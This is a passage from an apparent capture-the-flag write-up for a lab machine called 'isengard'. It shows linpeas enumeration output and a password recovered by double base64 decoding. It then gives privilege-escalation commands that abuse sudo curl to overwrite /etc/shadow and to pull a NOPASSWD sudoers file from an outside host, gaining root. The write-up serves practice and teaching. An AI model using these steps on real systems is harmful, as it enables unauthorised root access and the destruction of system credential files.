uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

╔══════════╣ Login now
 07:21:09 up 45 min,  0 users,  load average: 0.60, 0.27, 1.14                                                                                                         
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     tty1         Thu Nov 11 07:56:35 2021 - Thu Nov 11 07:56:50 2021  (00:00)     0.0.0.0                                                                         
root     tty1         Thu Nov 11 07:55:04 2021 - Thu Nov 11 07:56:22 2021  (00:01)     0.0.0.0
reboot   system boot  Thu Nov 11 07:54:58 2021   still running                         0.0.0.0
reboot   system boot  Thu Nov 11 07:52:38 2021   still running                         0.0.0.0
sauron   tty1         Thu Nov 11 07:46:54 2021 - crash                     (00:05)     0.0.0.0
reboot   system boot  Thu Nov 11 07:45:34 2021   still running                         0.0.0.0
sauron   tty1         Thu Nov 11 07:30:25 2021 - Thu Nov 11 07:37:01 2021  (00:06)     0.0.0.0
reboot   system boot  Thu Nov 11 07:29:19 2021   still running                         0.0.0.0

wtmp begins Thu Nov 11 07:29:19 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                      
root             tty1                      Thu Nov 11 19:41:28 -0500 2021
sauron           tty1                      Thu Nov 11 08:02:59 -0500 2021

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                       
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                       


                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                                 
                                       ╚══════════════════════╝                                                                                                        
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                        
/usr/bin/curl
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                                                                       
╔══════════╣ Searching mysql credentials and exec
Potential file containing credentials:                                                                                                                                 
-rw-r--r-- 1 root root 641 Apr  3  2021 /etc/apparmor.d/abstractions/mysql
Strings not found, cat the file and check it to get the creds

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.51 (Debian)                                                                                                                 
Server built:   2021-10-07T17:49:44
httpd Not Found
                                                                                                                                                                       
Nginx version: nginx Not Found
                                                                                                                                                                       
./linpeas.sh: 2583: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 11 08:00 /etc/apache2/sites-enabled                                                                                                    
drwxr-xr-x 2 root root 4096 Nov 11 08:00 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Nov 11 08:00 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Aug  8  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Nov 11 08:00 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 73002 Oct 23 17:53 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72600 Oct 23 17:53 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                   
drwxr-xr-x 2 root root 4096 Nov 11 07:26 /etc/ldap


╔══════════╣ Searching ssl/ssh files
./linpeas.sh: 2769: gpg-connect-agent: not found                                                                                                                       

Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 11 07:58 /etc/pam.d                                                                                                                    




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 11 07:23 /usr/share/keyrings                                                                                                           




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                         
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found                                                                                                                                                          
netpgpkeys Not Found                                                                                                                                                   
netpgp Not Found                                                                                                                                                       
                                                                                                                                                                       
-rw-r--r-- 1 root root 8700 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 8700 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 55625 Feb 25  2021 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 36873 Feb 25  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg



╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                       

-rw-r--r-- 1 root root 69 Oct 23 17:53 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct 23 17:53 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 826 Aug 12  2020 /usr/share/bash-completion/completions/bind                                                                                    
-rw-r--r-- 1 root root 826 Aug 12  2020 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Aug  4  2021 /etc/skel/.bashrc                                                                                                             





-rw-r--r-- 1 root root 807 Aug  4  2021 /etc/skel/.profile






                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                                
                                         ╚═══════════════════╝                                                                                                         
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
strings Not Found                                                                                                                                                      
strace Not Found                                                                                                                                                       
-rwsr-xr-- 1 root messagebus 51K Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                              
-rwsr-xr-x 1 root root 471K Mar 13  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 55K Jul 28  2021 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 35K Jul 28  2021 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Jul 28  2021 /usr/bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
-rwxr-sr-x 1 root shadow 38K Aug 26  2021 /usr/sbin/unix_chkpwd                                                                                                        
-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage
-rwxr-sr-x 1 root ssh 347K Mar 13  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Jul 28  2021 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root tty 23K Jul 28  2021 /usr/bin/write.ul (Unknown SGID binary)
-rwxr-sr-x 1 root mail 23K Feb  4  2021 /usr/bin/dotlockfile

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                                    
/etc/ld.so.conf                                                                                                                                                        
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                             
Current capabilities:                                                                                                                                                  
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                                     
files with acls in searched folders Not Found                                                                                                                          
                                                                                                                                                                       
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                                  
/usr/bin/gettext.sh                                                                                                                                                    

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                                                            
/initrd.img.old
/vmlinuz.old
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                                           
total 12                                                                                                                                                               
drwxr-xr-x  2 root root 4096 Nov 11 07:26 .
drwxr-xr-x 68 root root 4096 Mar 31 06:35 ..
-rw-r--r--  1 root root  726 Aug 12  2020 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                             
                                                                                                                                                                       
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                           
═╣ Credentials in fstab/mtab? ........... No                                                                                                                           
═╣ Can I read shadow files? ............. No                                                                                                                           
═╣ Can I read shadow plists? ............ No                                                                                                                           
═╣ Can I write shadow plists? ........... No                                                                                                                           
═╣ Can I read opasswd file? ............. No                                                                                                                           
═╣ Can I write in network-scripts? ...... No                                                                                                                           
═╣ Can I read root folder? .............. No                                                                                                                           
                                                                                                                                                                       
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                 
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                       
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                       
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/daemon.log                                                                                                                                                    
/var/log/auth.log
/var/log/syslog
/var/log/journal/05e2b8ea75b843208bf2b8cb2fed08a7/system.journal

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                                   
logrotate 3.18.0                                                                                                                                                       

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                                       
╔══════════╣ Files inside others home (limit 20)
                                                                                                                                                                       
╔══════════╣ Searching installed mail applications
                                                                                                                                                                       
╔══════════╣ Mails (limit 50)
                                                                                                                                                                       
╔══════════╣ Backup folders
                                                                                                                                                                       
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz                                                                                      
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 9483 Sep 30 15:36 /usr/lib/modules/5.10.0-9-amd64/kernel/drivers/net/team/team_mode_activebackup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
                                                                                                                                                                       
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                             
total 12K
drwxr-xr-x  3 root root 4.0K Nov 11 08:00 .
drwxr-xr-x 12 root root 4.0K Nov 11 08:00 ..
drwxr-xr-x  3 root root 4.0K Nov 11 08:05 html

/var/www/html:
total 44K
drwxr-xr-x 3 root root 4.0K Nov 11 08:05 .
drwxr-xr-x 3 root root 4.0K Nov 11 08:00 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 Aug  4  2021 /etc/skel/.bash_logout                                                                                                         
-rw------- 1 root root 0 Nov 11 07:23 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Mar 31 06:35 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 0 Feb 22  2021 /usr/share/dictionaries-common/site-elisp/.nosearch

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 7935 Nov 11 19:41 /var/backups/apt.extended_states.0                                                                                            

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                           
/dev/mqueue                                                                                                                                                            
/dev/shm
/dev/shm/linpeas.sh
/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt
/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt/ring.zip
/run/lock
/run/lock/apache2
/tmp
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/tmp
/var/www/html/y0ush4lln0tp4ss/east/mellon.php

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                           
                                                                                                                                                                       
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                             
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                       
╔══════════╣ Searching passwords inside logs (limit 70)
2021-11-11 12:23:30 configure base-passwd:amd64 3.5.51 3.5.51                                                                                                          
2021-11-11 12:23:30 install base-passwd:amd64 <none> 3.5.51
2021-11-11 12:23:30 status half-configured base-passwd:amd64 3.5.51
2021-11-11 12:23:30 status half-installed base-passwd:amd64 3.5.51
2021-11-11 12:23:30 status installed base-passwd:amd64 3.5.51
2021-11-11 12:23:30 status unpacked base-passwd:amd64 3.5.51
2021-11-11 12:23:37 status half-configured base-passwd:amd64 3.5.51
2021-11-11 12:23:37 status half-installed base-passwd:amd64 3.5.51
2021-11-11 12:23:37 status unpacked base-passwd:amd64 3.5.51
2021-11-11 12:23:37 upgrade base-passwd:amd64 3.5.51 3.5.51
2021-11-11 12:23:40 install passwd:amd64 <none> 1:4.8.1-1
2021-11-11 12:23:40 status half-installed passwd:amd64 1:4.8.1-1
2021-11-11 12:23:40 status unpacked passwd:amd64 1:4.8.1-1
2021-11-11 12:23:43 configure base-passwd:amd64 3.5.51 <none>
2021-11-11 12:23:43 status half-configured base-passwd:amd64 3.5.51
2021-11-11 12:23:43 status installed base-passwd:amd64 3.5.51
2021-11-11 12:23:43 status unpacked base-passwd:amd64 3.5.51
2021-11-11 12:23:45 configure passwd:amd64 1:4.8.1-1 <none>
2021-11-11 12:23:45 status half-configured passwd:amd64 1:4.8.1-1
2021-11-11 12:23:45 status installed passwd:amd64 1:4.8.1-1
2021-11-11 12:23:45 status unpacked passwd:amd64 1:4.8.1-1
Description: Set up users and passwords
```

```bash
$ cd /opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt/
$ unzip ring.txt
$ cat ring.txt
ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==
$ echo 'ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==' | base64 -d
eVhLTXc1d3BTQXJMMkNMWAo=
$ echo 'eVhLTXc1d3BTQXJMMkNMWAo=' | base64 -d            
yXKMw5wpSArL2CLX
```

* Pivoting User (www-data > sauron)

## Priviledge Escalation - [curl](https://gtfobins.github.io/gtfobins/curl/)

```bash 
sauron@isengard:~$ sudo -l
[sudo] password for sauron: 
Matching Defaults entries for sauron on isengard:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sauron may run the following commands on isengard:
    (ALL) /usr/bin/curl
sauron@isengard:~$
```

```bash
$ mkpasswd                                        
Password: 
$y$j9T$kHz8cygy2Fc.8AuqyevcG.$pUzr0BOXj6kaIMEwdZ72io.si/IYAYGUv5XqSVLD4b8

$ LFILE=/etc/shadow
$ TF=$(mktemp)
$ echo '$y$j9T$kHz8cygy2Fc.8AuqyevcG.$pUzr0BOXj6kaIMEwdZ72io.si/IYAYGUv5XqSVLD4b8' >$TF
$ sudo curl "file://$TF" -o "$LFILE"
```

### Modify user sudo settings (sudouser)

```
sauron ALL=(ALL) NOPASSWD: ALL
```

```
$ sudo curl http://192.168.1.6:8888/sudouser -o /etc/sudoers.d/sauron
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    31  100    31    0     0   1937      0 --:--:-- --:--:-- --:--:--  1937
sauron@isengard:/tmp$ sudo su
root@isengard:/tmp#
```